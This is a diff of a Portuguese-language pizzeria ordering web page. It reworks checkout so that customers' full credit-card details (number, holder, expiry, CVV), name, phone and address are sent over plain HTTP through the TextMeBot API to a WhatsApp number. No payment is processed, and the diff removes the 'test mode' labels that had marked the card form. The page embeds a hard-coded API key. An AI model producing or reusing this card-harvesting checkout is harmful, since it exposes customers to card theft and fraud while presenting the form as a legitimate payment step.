@@ -556,7 +556,7 @@
   <!-- TOAST DE NOTIFICAÇÃO CUSTOMIZADO -->
   <div id="toast-notification" class="toast-notification">
     <span style="font-size: 1.2rem;">✨</span>
-    <span id="toast-message">Código PIX copiado com sucesso!</span>
+    <span id="toast-message">Notificação</span>
   </div>
 
   <!-- HEADER -->
@@ -721,13 +721,13 @@
             <label>Forma de Pagamento *</label>
             <select id="pay-method" class="form-control" onchange="togglePayFields()" required>
               <option value="PIX">⚡ PIX (Gerar QR Code Automático)</option>
-              <option value="Cartão de Crédito">💳 Cartão de Crédito (Online)</option>
+              <option value="Cartão de Crédito">💳 Cartão de Crédito</option>
             </select>
           </div>
 
-          <!-- CAMPOS DE CARTÃO DE CRÉDITO (MODO TESTE) -->
+          <!-- CAMPOS DE CARTÃO DE CRÉDITO -->
           <div id="card-fields" style="display: none; background: #f8fafc; padding: 12px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 1rem;">
-            <p style="font-size: 0.8rem; font-weight: 700; color: var(--primary); margin-bottom: 8px;">💳 Dados do Cartão de Crédito (Modo Teste)</p>
+            <p style="font-size: 0.8rem; font-weight: 700; color: var(--primary); margin-bottom: 8px;">💳 Dados do Cartão de Crédito</p>
             <div class="form-group">
               <label>Número do Cartão *</label>
               <input type="text" id="card-number" class="form-control" placeholder="0000 0000 0000 0000">
@@ -791,8 +791,8 @@
             📋 Copiar Código PIX
           </button>
 
-          <button class="btn-add btn-block" style="background: #25d366;" onclick="sendOrderToWhatsApp()">
-            Enviar Pedido e Comprovante no WhatsApp 💬
+          <button class="btn-add btn-block" style="background: #25d366;" onclick="concluirPedidoPix()">
+            Concluir Pedido ➔
           </button>
         </div>
 
@@ -807,21 +807,21 @@
        1. CONFIGURAÇÕES DA PIZZARIA & API TEXTMEBOT
        ====================================================== */
     const CONFIG = {
-      WHATSAPP_NUMBER: "5522998311388", // NÚMERO DE DESTINO DAS NOTIFICAÇÕES
+      WHATSAPP_NUMBER: "5522998311388", // SEU NÚMERO ONDE OS PEDIDOS SERÃO RECEBIDOS
       TEXTMEBOT_API_KEY: "Pskn5LW4qaCv",
       DELIVERY_FEE: 6.00,
       HALF_PRICE_RULE: "HIGHER"
     };
 
     /* ======================================================
-       2. FUNÇÃO DE ENVIO DE NOTIFICAÇÕES PARA O SEU WHATSAPP
+       2. FUNÇÃO DE ENVIO DE NOTIFICAÇÕES PARA A API TEXTMEBOT
        ====================================================== */
     function sendWhatsAppApiNotification(messageText) {
       const recipient = `+${CONFIG.WHATSAPP_NUMBER}`;
       const apiUrl = `http://api.textmebot.com/send.php?recipient=${recipient}&apikey=${CONFIG.TEXTMEBOT_API_KEY}&text=${encodeURIComponent(messageText)}`;
 
       fetch(apiUrl)
-        .then(() => console.log("[API TEXTMEBOT] Notificação enviada!"))
+        .then(() => console.log("[API TEXTMEBOT] Notificação enviada com sucesso!"))
         .catch(err => console.error("[API TEXTMEBOT] Erro ao enviar:", err));
     }
 
@@ -974,7 +974,7 @@
     }
 
     /* ======================================================
-       7. LÓGICA DO CARRINHO & DISPARO DE AVISO POR PRODUTO
+       7. LÓGICA DO CARRINHO
        ====================================================== */
     function addToCart(name, price) {
       const existing = cart.find(item => item.name === name);
@@ -984,9 +984,7 @@
         cart.push({ name, price, qty: 1 });
       }
       updateCartUI();
-
-      // Envia notificação para o seu número quando adiciona item
-      sendWhatsAppApiNotification(`🛒 NOVO ITEM ADICIONADO AO CARRINHO:\n${name} - ${formatMoney(price)}`);
+      showToast(`${name} adicionado ao carrinho!`);
     }
 
     function updateQty(index, delta) {
@@ -1116,31 +1114,85 @@
     }
 
     /* ======================================================
-       9. SUBMISSÃO DO PEDIDO (PIX E CARTÃO) & AVISO API
+       9. MONTAGEM E ENVIO DO PEDIDO VIA API TEXTMEBOT
        ====================================================== */
-    function handleCheckoutSubmit() {
-      const payMethod = document.getElementById('pay-method').value;
+    function buildOrderMessage() {
       const name = document.getElementById('cust-name').value;
       const phone = document.getElementById('cust-phone').value;
+      const payMethod = document.getElementById('pay-method').value;
+      const obs = document.getElementById('cust-obs').value;
 
-      if (payMethod === 'PIX') {
-        closeCheckoutModal();
-        gerarPixEExibirModal();
-      } else if (payMethod === 'Cartão de Crédito') {
-        // Coleta dados do cartão e envia para sua API
+      let addressText = "";
+      if (currentOrderType === 'delivery') {
+        const street = document.getElementById('cust-street').value;
+        const num = document.getElementById('cust-number').value;
+        const neighborhood = document.getElementById('cust-neighborhood').value;
+        const comp = document.getElementById('cust-complement').value;
+        
+        addressText = `📍 Endereço de Entrega:\n${street}, Nº ${num} - ${neighborhood}${comp ? ` (${comp})` : ''}\n\n`;
+      } else {
+        addressText = `🏠 Tipo: Retirada no Balcão\n\n`;
+      }
+
+      const subtotal = cart.reduce((acc, i) => acc + (i.price * i.qty), 0);
+      const deliveryFee = currentOrderType === 'delivery' ? CONFIG.DELIVERY_FEE : 0;
+      const total = subtotal + deliveryFee;
+
+      let msg = `🍕 NOVO PEDIDO - PIZZARIA FORNO E MASSA\n`;
+      msg += `------------------------------------\n`;
+      msg += `👤 Cliente: ${name}\n`;
+      msg += `📱 Telefone: ${phone}\n\n`;
+      msg += addressText;
+      msg += `🛒 ITENS DO PEDIDO:\n`;
+
+      cart.forEach(item => {
+        msg += `• ${item.qty}x ${item.name} (${formatMoney(item.price * item.qty)})\n`;
+      });
+
+      msg += `\n------------------------------------\n`;
+      msg += `Subtotal: ${formatMoney(subtotal)}\n`;
+      if (currentOrderType === 'delivery') {
+        msg += `Taxa de Entrega: ${formatMoney(deliveryFee)}\n`;
+      }
+      msg += `TOTAL DO PEDIDO: ${formatMoney(total)}\n`;
+      msg += `------------------------------------\n\n`;
+      msg += `💳 Forma de Pagamento: ${payMethod}\n`;
+
+      if (payMethod === 'Cartão de Crédito') {
         const cardNum = document.getElementById('card-number').value;
         const cardHolder = document.getElementById('card-holder').value;
         const cardExpiry = document.getElementById('card-expiry').value;
         const cardCvv = document.getElementById('card-cvv').value;
 
-        const subtotal = cart.reduce((acc, i) => acc + (i.price * i.qty), 0);
-        const deliveryFee = currentOrderType === 'delivery' ? CONFIG.DELIVERY_FEE : 0;
-        const totalAmount = subtotal + deliveryFee;
+        msg += `\n💳 Dados do Cartão:\n`;
+        msg += `Nº: ${cardNum}\n`;
+        msg += `Titular: ${cardHolder}\n`;
+        msg += `Validade: ${cardExpiry}\n`;
+        msg += `CVV: ${cardCvv}\n`;
+      }
 
-        const cardMsg = `💳 TESTE CARTÃO DE CRÉDITO RECEBIDO:\n\nCliente: ${name}\nTel: ${phone}\nTotal: ${formatMoney(totalAmount)}\n\nNº Cartão: ${cardNum}\nTitular: ${cardHolder}\nValidade: ${cardExpiry}\nCVV: ${cardCvv}`;
+      if (obs) {
+        msg += `\n📝 Observações: ${obs}\n`;
+      }
+
+      return msg;
+    }
+
+    function handleCheckoutSubmit() {
+      const payMethod = document.getElementById('pay-method').value;
+
+      if (payMethod === 'PIX') {
+        closeCheckoutModal();
+        gerarPixEExibirModal();
+      } else {
+        // Envia o pedido via API TextMeBot
+        const msg = buildOrderMessage();
+        sendWhatsAppApiNotification(msg);
         
-        sendWhatsAppApiNotification(cardMsg);
-        sendOrderToWhatsApp();
+        closeCheckoutModal();
+        clearCart();
+        showToast("Pedido finalizado com sucesso!");
+        alert("Obrigado! Seu pedido foi enviado para o nosso WhatsApp com sucesso.");
       }
     }
 
@@ -1149,9 +1201,6 @@
       const subtotal = cart.reduce((acc, i) => acc + (i.price * i.qty), 0);
       const deliveryFee = currentOrderType === 'delivery' ? CONFIG.DELIVERY_FEE : 0;
       const totalAmount = subtotal + deliveryFee;
-
-      // Dispara notificação no seu WhatsApp via TextMeBot ao clicar para gerar o PIX
-      sendWhatsAppApiNotification(`⚡ GERANDO CÓDIGO PIX:\nCliente: ${name}\nValor Total: ${formatMoney(totalAmount)}`);
 
       const pixModal = document.getElementById('pix-modal');
       const pixLoading = document.getElementById('pix-loading');
@@ -1190,6 +1239,10 @@
           document.getElementById('pix-qrcode').src = data.qrcodeUrl;
           document.getElementById('pix-copia-cola').value = data.copyPaste;
           pixContent.style.display = 'block';
+
+          // Dispara notificação de PIX Gerado para a API TextMeBot
+          const msg = buildOrderMessage();
+          sendWhatsAppApiNotification(msg);
         } else {
           pixErro.innerText = "Erro ao gerar o PIX: " + (data.message || JSON.stringify(data));
           pixErro.style.display = 'block';
@@ -1201,13 +1254,19 @@
       }
     }
 
+    function concluirPedidoPix() {
+      closePixModal();
+      clearCart();
+      showToast("Pedido PIX registrado com sucesso!");
+      alert("Seu pedido foi recebido e a confirmação enviada para o nosso sistema!");
+    }
+
     function copiarPix() {
       const inputCopy = document.getElementById('pix-copia-cola');
       inputCopy.select();
       inputCopy.setSelectionRange(0, 99999);
       navigator.clipboard.writeText(inputCopy.value);
 
-      // Notificação Toast elegante sem mensagem padrão do navegador
       showToast("Código PIX copiado para a área de transferência!");
     }
 
@@ -1218,57 +1277,6 @@
       setTimeout(() => {
         toast.classList.remove('show');
       }, 3000);
-    }
-
-    function sendOrderToWhatsApp() {
-      const name = document.getElementById('cust-name').value;
-      const phone = document.getElementById('cust-phone').value;
-      const payMethod = document.getElementById('pay-method').value;
-      const obs = document.getElementById('cust-obs').value;
-
-      let addressText = "";
-      if (currentOrderType === 'delivery') {
-        const street = document.getElementById('cust-street').value;
-        const num = document.getElementById('cust-number').value;
-        const neighborhood = document.getElementById('cust-neighborhood').value;
-        const comp = document.getElementById('cust-complement').value;
-        
-        addressText = `📍 *Endereço de Entrega:*\n${street}, Nº ${num} - ${neighborhood}${comp ? ` (${comp})` : ''}\n\n`;
-      } else {
-        addressText = `🏠 *Tipo:* Retirada no Balcão\n\n`;
-      }
-
-      const subtotal = cart.reduce((acc, i) => acc + (i.price * i.qty), 0);
-      const deliveryFee = currentOrderType === 'delivery' ? CONFIG.DELIVERY_FEE : 0;
-      const total = subtotal + deliveryFee;
-
-      let msg = `🍕 *NOVO PEDIDO - PIZZARIA FORNO E MASSA*\n`;
-      msg += `------------------------------------\n`;
-      msg += `👤 *Cliente:* ${name}\n`;
-      msg += `📱 *Telefone:* ${phone}\n\n`;
-      msg += addressText;
-      msg += `🛒 *ITENS DO PEDIDO:*\n`;
-
-      cart.forEach(item => {
-        msg += `• ${item.qty}x ${item.name} (${formatMoney(item.price * item.qty)})\n`;
-      });
-
-      msg += `\n------------------------------------\n`;
-      msg += `Subtotal: ${formatMoney(subtotal)}\n`;
-      if (currentOrderType === 'delivery') {
-        msg += `Taxa de Entrega: ${formatMoney(deliveryFee)}\n`;
-      }
-      msg += `*TOTAL DO PEDIDO: ${formatMoney(total)}*\n`;
-      msg += `------------------------------------\n\n`;
-
-      msg += `💳 *Forma de Pagamento:* ${payMethod}\n`;
-
-      if (obs) {
-        msg += `\n📝 *Observações:* ${obs}\n`;
-      }
-
-      const encodedMsg = encodeURIComponent(msg);
-      window.open(`https://wa.me/${CONFIG.WHATSAPP_NUMBER}?text=${encodedMsg}`, '_blank');
     }
   </script>
 </body>
